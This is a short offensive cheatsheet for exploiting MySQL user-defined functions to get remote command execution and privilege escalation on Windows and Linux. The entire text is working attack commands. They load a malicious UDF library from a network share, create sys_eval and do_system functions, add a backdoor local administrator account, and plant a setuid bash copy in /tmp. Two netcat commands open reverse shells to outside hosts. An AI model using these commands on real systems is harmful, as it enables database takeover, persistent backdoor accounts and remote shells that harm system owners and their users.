# MySQL User Defined Functions Exploitation to RCE or PrivEsc simple cheatsheet

## *Setup for Windows*

```bash
select @@version_compile_os, @@version_compile_machine;
```
```bash
select @@plugin_dir;
```
```bash
select load_file('\\\\10.0.0.5\\share\\lib_mysqludf_sys_64.dll') into dumpfile "<Plugin-Directory>\\udf.dll";
```
```bash
create function sys_bineval returns int soname 'udf.dll';
```
```bash
create function sys_eval returns string soname 'udf.dll';
```
```bash
select * from mysql.func where name = 'sys_bineval';
```
```bash
select * from mysql.func where name = 'sys_eval';
```

## *Execute Commands Samples for Windows*

```bash
select sys_eval('dir C:\\Users\\4rch\\Desktop\\');
```
```bash
select sys_exec("net user 4rchantos Passwd1 /add");
```
```bash
select sys_exec("net localgroup Administrators 4rchantos /add");
```
```bash
select sys_eval("net use X: \\\\10.0.0.5\\share /user:user passwd");
```
```bash
select sys_eval("C:\\Users\\4rch\\Desktop\\nc.exe -e cmd.exe 192.168.49.125 80");
```


## *Setup for Linux*

```bash
select @@version_compile_os, @@version_compile_machine;
```
```bash
show variables like '%plugin%';
```
```bash
use mysql;
```
```bash
create table foo(line blob);
```
```bash
insert into foo values(load_file('/tmp/lib_mysqludf_sys_64.so'));
```
```bash
select * from foo into dumpfile '<Plugin-Directory>/raptor_udf.so';
```
```bash
create function do_system returns integer soname 'raptor_udf.so';
```
```bash
select * from mysql.func;
```
```bash
select do_system('<command>');
```

## *Execute Privilege Escalation Commands Samples for Linux*
```bash
select do_system('cp /bin/bash /tmp/4rch; chmod +xs /tmp/4rch');
```
```bash
/tmp/4rch -p
```
```bash
select do_system('id > /tmp/out; chown raptor.raptor /tmp/out');
```
```bash
\! sh
```

## *Execute Command Samples for Linux*
```bash
select do_system('id > /var/www/output; chown www-data www-data  /var/www/output');
```
```bash
select do_system('nc 10.0.0.5 1337 -e /bin/bash');
```

